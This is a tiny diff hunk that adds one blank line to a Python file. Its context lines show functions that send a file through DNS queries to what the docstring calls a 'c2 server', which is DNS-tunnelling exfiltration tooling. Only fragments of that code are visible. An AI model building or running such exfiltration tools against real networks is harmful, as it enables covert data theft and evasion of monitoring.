@@ -58,6 +58,7 @@ def send_file_dns_over_udp(filename: str, dns_server: str):
     send_plaintext_query(query=finish_query,dns_server=dns_server)
 
     print("Done sending")
+    
 
 def send_plaintext_query(query: str, dns_server: str):
     """sends a query using the dnspython package to the c2 server. 
